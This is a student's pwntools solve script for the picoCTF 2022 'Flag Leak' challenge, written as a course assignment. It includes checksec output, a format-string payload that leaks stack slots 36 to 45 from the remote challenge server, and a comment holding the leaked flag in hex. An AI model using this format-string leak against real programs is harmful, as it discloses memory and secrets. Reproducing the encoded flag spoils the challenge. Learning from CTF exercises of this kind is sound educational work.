'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP15: Flag Leak
File Description:  Solving "Flag Leak" from PICO 2022

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78) Symbols       No    0               2               vuln

File info:
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7cdf03860c5c78d6e375e91d88a2b05b28389fd0, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Flag is on stack, starts at %36$p

'''

# Import Libraries
from pwn import *

# Leak string
leaker=b"%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p"

# Start process
# p=process("./vuln")
p=remote("saturn.picoctf.net", 63337)
p.recv()
p.sendline(leaker)
p.recv()

# For some reason won't recieve in my script but will int interactive
# Flag in wrong order = 0x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x655f6b630x346239620x7d326136
# need to convert to ascii and to little endian
